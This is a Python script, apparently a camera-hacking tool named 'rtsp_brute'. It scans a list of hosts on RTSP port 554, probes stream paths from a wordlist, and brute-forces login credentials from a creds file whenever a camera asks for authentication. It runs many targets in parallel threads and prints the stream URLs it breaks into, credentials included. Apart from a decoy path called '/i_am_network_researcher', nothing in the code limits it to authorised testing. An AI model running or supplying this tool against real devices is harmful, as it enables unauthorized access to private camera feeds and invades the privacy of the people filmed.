#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import os
from pathlib import Path
from socket import (
    SOL_SOCKET,
    SO_BINDTODEVICE,
    SocketIO,
    create_connection,
    setdefaulttimeout,
    socket,
    timeout,
)
from time import sleep, time

from fire import Fire
from tqdm import tqdm

from lib.rtsp import get_auth_header_fn


FAKE_PATH = '/i_am_network_researcher'

WORK_DIR = Path(os.path.dirname(os.path.abspath(__file__)))

DATA_DIR = WORK_DIR / 'data'
LOCAL_DIR = WORK_DIR / 'local'

LOG_FILE = LOCAL_DIR / 'rtsp_brute.log'
PATHS_FILE = DATA_DIR / 'rtsp_paths1.txt'
CREDS_FILE = DATA_DIR / 'rtsp_creds_my.txt'

M_OPTIONS = 'OPTIONS'
M_DESCRIBE = 'DESCRIBE'


paths = [FAKE_PATH] + [ln.rstrip() for ln in open(PATHS_FILE)]
creds = [ln.rstrip() for ln in open(CREDS_FILE)]

cseqs = dict()


def query(connection: socket, url: str = '*', headers: dict = {}) -> tuple[int, dict]:
    method = M_OPTIONS if url == '*' else M_DESCRIBE

    if url == '*':
        cseq = 0
    else:
        cseq = cseqs.get(connection, 0)

    cseq += 1

    cseqs[connection] = cseq

    headers_str = '\r\n'.join('%s: %s' % v for v in headers.items())

    if headers_str:
        headers_str += '\r\n'

    request = (
        '%s %s RTSP/1.0\r\n'
        'CSeq: %d\r\n'
        '%s'
        'User-Agent: Mozilla/5.0\r\n'
        'Accept: application/sdp\r\n'
        '\r\n'
    ) % (method, url, cseq, headers_str)

    logging.info('\n<< %s' % request.rstrip())

    headers = {}
    try:
        connection.sendall(request.encode())
        response = connection.recv(1024).decode()

        logging.info('\n>> %s' % response.rstrip())

        if response.startswith('RTSP/'):
            _, code, _ = response.split(None, 2)
            code = int(code)

            for ln in response.splitlines()[2:]:
                if not ln:
                    break
                if ':' in ln:
                    k, v = ln.split(':', 1)
                    headers[k.lower()] = v.strip()

            # cam not uses RFC, fix it
            if code == 200 and 'WWW-Authenticate' in response:
                code = 401

            return code, headers

    except KeyboardInterrupt:
        raise
    except BrokenPipeError as e:
        logging.error(repr(e))
    except timeout as e:
        logging.error(repr(e))
    except ConnectionResetError as e:
        logging.error(repr(e))
    except UnicodeDecodeError as e:
        logging.error(repr(e))
    except Exception as e:
        logging.error(repr(e))

    return 500, headers


def get_url(host: str, port: int = 554, path: str = '', cred: str = '') -> str:
    if cred:
        cred = '%s@' % cred
    return 'rtsp://%s%s:%d%s' % (cred, host, port, path)


def connect(host: str, port: int, interface: str = '') -> SocketIO:
    start = time()

    # for OSError, timeout handled only once
    while time() - start < 3:
        try:
            logging.info('Connecting to %s:%s' % (host, port))
            c = create_connection((host, port), 3)
            c.settimeout(3)
            if interface:
                c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
            logging.info('Connected to %s:%s' % (host, port))
            return c
        except KeyboardInterrupt:
            raise
        except timeout as e:
            logging.error(repr(e))
            return
        except OSError as e:
            logging.error(repr(e))
            sleep(1)
        except Exception as e:
            logging.error(repr(e))
            return


def process_target(target_params: tuple[str, int, bool, str]) -> list[str]:
    host, port, single_path, interface = target_params
    connection = connect(host, port, interface)

    results = []

    if not connection:
        return results  # next host

    with connection:
        # OPTIONS query
        code, _ = query(connection)

        if code != 200:
            return results

        for path in paths:
            url = get_url(host, port, path)
            code, headers = query(connection, url)

            if code >= 500:
                return results

            # potential ban?
            # if code == 403:
            #     return results

            if code == 200:
                # if FAKE_PATH is ok,
                # root path will be ok too
                if path == FAKE_PATH:
                    url = get_url(host, port, '/')

                results.append(url)

                if single_path:
                    return results

                continue

            if path == FAKE_PATH:  # no auth for fake path
                continue

            if code == 401:
                # TODO: mv that to lower abstraction level
                auth_fn = get_auth_header_fn(headers)

                # bruteforcing creds
                for cred in creds:
                    url = get_url(host, port, path)
                    auth_headers = auth_fn(M_DESCRIBE, url, *cred.split(':'))
                    code, headers = query(connection, url, auth_headers)

                    if code >= 500:
                        return results

                    if code == 200:
                        results.append(get_url(host, port, path, cred))
                        if single_path:
                            return results
                        break  # one cred per path is enough

                # if no one cred accepted,
                # we have no cred for another paths i think
                if not results:
                    break

    return results


def main(H: str = '', w: int = None, sp: bool = False, i: str = '', d: bool = False):
    logging.basicConfig(filename=LOG_FILE,
                        level=logging.INFO if d else logging.CRITICAL)
    results = []
    hosts_file_path = H or LOCAL_DIR / 'hosts_554.txt'

    with ThreadPoolExecutor(w) as executor:
        with open(hosts_file_path) as hosts_file:
            futures = {}

            for line in hosts_file:
                host = line.rstrip()
                port = 554

                if ':' in host:
                    host, port = host.split(':')

                arg = (host, port, sp, i)

                future = executor.submit(process_target, arg)
                futures[future] = arg

            with tqdm(total=len(futures)) as progress:
                for future in as_completed(futures):
                    host, port, *_ = futures[future]
                    res = future.result()
                    progress.update()
                    results += res

    for result in results:
        print(result)


if __name__ == "__main__":
    try:
        Fire(main)
    except KeyboardInterrupt:
        print('Interrupted by user')
        exit(130)
